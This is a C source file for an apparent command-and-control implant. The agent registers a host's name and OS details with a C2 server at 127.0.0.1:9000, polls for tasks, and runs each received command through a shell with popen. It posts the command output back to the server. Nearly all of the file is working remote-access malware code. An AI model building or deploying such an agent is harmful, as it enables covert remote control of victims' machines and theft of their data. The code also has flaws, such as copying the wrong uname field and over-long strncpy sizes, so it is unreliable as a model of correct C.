#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stddef.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/utsname.h>
#include "initiate.h"
#include "curl_utils.h"
#include "host_utils.h"

#define UUIDLEN 36

// Each task begins with a #(35 in DEC).
#define TASK_LINE 35

// Each task file ends with a $(36 in DEC).
#define END_OF_TASK_FILE 36

// ref https://curl.se/libcurl/c/postit2.html

static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);

// Obtains target host information (host name, OS, version).
bool get_host_info(struct agent_info *agent)
{
	// Get target hostname.
	if (gethostname(agent->hostname, sizeof(agent->hostname)) == -1)
	{
		perror("Error acquiring host name.\n");
		return false;
	}

	// Get target OS and version.
	struct utsname buf;
	errno = 0;
	if (uname(&buf) != 0)
	{
		perror("uname error\n");
		return false;
	}

	strncpy(agent->os_type, buf.nodename, sizeof(buf.nodename) + 1);
	strncpy(agent->os_version, buf.version, sizeof(buf.version) + 1);

	return true;
}
// Registers self with C2 server, providing target host information. 
bool reg(struct agent_info *agent, struct strings_array *sa)
{
	struct web_comms web = {NULL, 0, NULL};

	// Prepares curl for use across the various follow on functions that use
	// the curl library.
	if (!curl_prep(&web))
	{
		perror("curl_prep failed\n");
		exit(1);
	}

	add_curl_field(web.form, "hostname", agent->hostname);
	add_curl_field(web.form, "os type", agent->os_type);
	add_curl_field(web.form, "os version", agent->os_version);
	add_curl_field(web.form, "submit", "send");

	// Registration URL
	const char regurl[19] = "127.0.0.1:9000/reg";
	curl_easy_setopt(web.curl, CURLOPT_URL, regurl);

	// Set options for POST
	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);

	// Send data to mem_cb function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass sa to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);

	// Perform the request, res will get the return code
	web.res = curl_easy_perform(web.curl);

	// Check for errors
	if (web.res != CURLE_OK)
	{
		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
		return false;
	}

	// Always cleanup.
	curl_easy_cleanup(web.curl);

	// Then cleanup the form.
	curl_mime_free(web.form);

	return true;
}

// Takes write_function output and stores it in memory.
// Ref: https://everything.curl.dev/libcurl/callbacks/write
static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
{
	size_t realsize = size * nmemb;
	struct strings_array *mem = (struct strings_array *)userp;

	char *ptr = realloc(mem->response, mem->size + realsize + 1);
	if (!ptr)
	{
		/* out of memory! */
		printf("not enough memory (realloc returned NULL)\n");
		return 0;
	}

	mem->response = ptr;
	memcpy(&(mem->response[mem->size]), contents, realsize);
	mem->size += realsize;
	mem->response[mem->size] = 0;


	return realsize;
}

// Parses UUID from C2 registration response and concatenates to base tasks URL
// to create complete tasks URL. Assigns URL value to corresponding field in
// the agent_info struct.
void create_tasks_url(char *response, struct agent_info *agent)
{
	char *ret;

	// Strchr for @, as the c2 server precedes the UUID with the @ character.
	ret = strchr(response, '@');

	// Move pointer to the right one (ret +1) to copy UUID after the @ char.
	strncpy(agent->uuid, ret + 1, UUIDLEN);

	// Concat agent UUID to tasks URL.
	char tasks_url[64] = "127.0.0.1:9000/tasks/";
	strncat(tasks_url, agent->uuid, strlen(agent->uuid));

	// Copy URL to agent->tasks_url.
	strncpy(agent->tasks_url, tasks_url, strlen(tasks_url) +1);
	printf("Tasks URL is: %s", agent->tasks_url);

	// Registration response is no longer needed. Free memory.
    free(response);

}

// Parses UUID from C2 registration response and concatenates to base tasks URL
// to create complete tasks URL. Assigns URL value to corresponding field in
// the agent_info struct.
void create_results_url(struct agent_info *agent, struct tasks *task)
{
	// Concat agent UUID to results URL.
	// Results base URL
	char res_url[64] = "127.0.0.1:9000/results/";
	strncat(res_url, agent->uuid, strlen(agent->uuid));

	// Copy URL to agent->results_url.
	strncpy(task->results_url, res_url, strlen(res_url) +1);
	printf("Results URL is: %s", task->results_url);

}

// Executes GET request to C2 server to check for tasks.
bool check_tasks(struct agent_info *agent, struct strings_array *sa)
{
    struct web_comms web = {NULL, 0, NULL};

    if (!curl_prep(&web))
    {
        perror("curl_prep failed\n");
        return false;
    }

	curl_easy_setopt(web.curl, CURLOPT_URL, agent->tasks_url);

	// Set sa->response to NULL / sa->size to 0 as it was used before.
	sa->response = NULL;
	sa->size = 0;

	// Send data to mem_cb function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass sa object to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);

	CURLcode result = curl_easy_perform(web.curl);

	if (result != CURLE_OK)
	{
		fprintf(stderr, "download problem: %s\n",
				curl_easy_strerror(result));
				return false;
	}

	curl_easy_cleanup(web.curl);
	curl_mime_free(web.form);

	return true;
}

// Parses task file received from C2 server and assigns values to task struct
// fields.
bool parse_tasks(char *response, struct tasks *task)
{
	char line[1024] = { '\0' };
	FILE *response_file = char_to_file(response);

	task->tasks_array = malloc((task->cap) * sizeof(*task->tasks_array));
	if (!task->tasks_array) {
		perror("Unable to create space for words.\n");
		return 1;
	}
	int count = 0;
    memset(line, 0, sizeof(line));

	char **tmp_space = NULL;
// While loop reads each line FILE *word_source (file(s) or stdin).
	while (fgets(line, sizeof(line), response_file) != NULL) {
		++count;
		printf("Line nmb %d %s\n", count, line);
		/*Resizes the array after a valid token is created to allocate
			space for new token. */
		if (task->sz == task->cap) {
			task->cap *= 2;
			tmp_space = realloc(task->tasks_array,
							task->cap *
							sizeof(*task->tasks_array));
			if (!tmp_space) {
				perror("Unable to resize.\n");
				fclose(response_file);
				destroy(task);
				return false;
			}
			task->tasks_array = tmp_space;
		}

		size_t len = strlen(line) + 1;
		task->tasks_array[task->sz] =
			malloc(len * sizeof(task->tasks_array[task->sz]));
		if (!task->tasks_array[task->sz]) {
			perror("Unable to resize.\n");
			fclose(response_file);
			destroy(task);
			return false;
		}
		
		if (line[0] == TASK_LINE) {
			strncpy(task->tasks_array[task->sz], line + 1, len);
			task->sz++;
		}

		// Each task file ends with a #(35 in DEC).
		if (line[0] == END_OF_TASK_FILE) {
			puts("hit break statment\n");
			break;
		}
    	memset(line, 0, sizeof(line));

	}
	puts("********PARSED TASKS*************************");
	for (unsigned int i = 0; i < task->sz; i++) {
		printf("%s\n", task->tasks_array[i]);
	}
	fclose(response_file);
	return true;
}

// ref: https://www.linuxquestions.org/questions/linux-newbie-8/
// help-in-getting-return-status-of-popen-sys-call-870219/
// Executes a shell cmd.
bool exec_cmd(struct tasks *task)
{
    if (!can_run_cmd(task->cmd))
    {
        const char *no_binary_msg = "CMD Execution Failed: Command binary does not exist on tgt host.";
        printf("Command binary %s does not exist\n", task->cmd);
        task->results = strdup(no_binary_msg);
        // Will need to update this portion here to copy
        // failed results to task results, for posting
        // back in main.
        return false;
    }

	FILE *cmd_fptr = NULL;
	char line[1024] = {'\0'};
	int cmd_ret = 0;
	size_t cur_len = 0;
	char *tmp_space = NULL;

	char space[1] = " ";
	strncat(task->cmd, space, 1);
	strncat(task->cmd, task->args, strlen(task->args));

	printf("Task->cmd after concat is: %s", task->cmd);

	if ((cmd_fptr = popen(task->cmd, "r")) != NULL)
	{
		while (fgets(line, sizeof(line), cmd_fptr) != NULL)
		{
			size_t buf_len = strlen(line) +1;
			tmp_space = realloc(task->results, buf_len + cur_len + 1);
			if (!tmp_space)
			{
				perror("Unable to resize.\n");
				fclose(cmd_fptr);
				free(task->results);
				return false;
			}
			task->results = tmp_space;
			strncpy(task->results + cur_len, line, buf_len);
			cur_len += buf_len;
		}
	}
	cmd_ret = pclose(cmd_fptr);
	printf("The exit status is: %d\n", WEXITSTATUS(cmd_ret));
    if (cmd_ret != 0)
    {
        char cmd_fail_msg[512] = "CMD Execution Failed: ";
        printf("Failed to execute %s\n", task->cmd);
        strncat(cmd_fail_msg, task->results, strlen(task->results) + 1);
        task->results = strdup(cmd_fail_msg);
        // Will need to update this portion here to copy
        // failed results to task results, for posting
        // back in main.
        return false;
    }

	return true;
}

// Posts task results to C2 server.
bool post_results(struct tasks *task, struct strings_array *sa)
{

	struct web_comms web = {NULL, 0, NULL};
	// struct strings_array chunk = {.response = malloc(0), .size = 0};
	sa->response = malloc(0);
	sa->size = 0;



	if (!curl_prep(&web))
	{
		perror("curl_prep failed\n");
		exit(1);
	}

	add_curl_field(web.form, "task id", task->id);
	add_curl_field(web.form, "task results", task->results);
	add_curl_field(web.form, "submit", "send");

	// // Registration URL
	// const char resurl[27] = "127.0.0.1:9000/results/uuid";

	curl_easy_setopt(web.curl, CURLOPT_URL, task->results_url);
	puts("********************************");
	printf("The tasks results url is %s\n", task->results_url);

	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);

	// Send data to this function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass chunk to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);

	// Perform the request, res will get the return code
	web.res = curl_easy_perform(web.curl);

	printf("The data returning from post results is %s\n\n", sa->response);

	// Check for errors
	if (web.res != CURLE_OK)
	{
		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
		return false;
	}

	// Always cleanup.
	curl_easy_cleanup(web.curl);
	
	// Then cleanup the form.
	curl_mime_free(web.form);

	return true;
}

// Frees memory for task array of strings.
void destroy(struct tasks *task)
{
	/* Iterates through array elements and frees memory of each line in words
	array.*/
	for (unsigned int j = 0; j < task->sz; j++) {
		if (task->tasks_array[j]) {
			free(task->tasks_array[j]);
		}
	}
	// Frees memory for entire file names array.
	if (task->tasks_array) {
		free(task->tasks_array);
	}

}

// Sets task struct values to zero.
void reset_task_vals(struct tasks *task)
{

	memset(task->id, 0, sizeof(task->id));
	task->type = 0;
	// memset(task->type, 0, sizeof(task->type));
	memset(task->cmd, 0, sizeof(task->cmd));
	memset(task->args, 0, sizeof(task->args));
}

//ref https://stackoverflow.com/questions/52974572/cast-char-to-file-without-saving-the-file
// Converts data from *char type to FILE type.
FILE *char_to_file(char *data) {

    int len;
	len = strlen(data);

    int p[2];
    if (pipe(p) == -1) {
        perror("pipe failed");
        return NULL;
    }

    int rval;
    if ((rval = write(p[1], data, len)) == -1) {
        perror("write failed");
        close(p[0]);
        close(p[1]);
        return NULL;
    } else if (rval < len) {
        printf("write failed, wrote %d, expected %d\n", rval, len);
        close(p[0]);
        close(p[1]);
        return NULL;
    }

    return fdopen(p[0], "r");
}

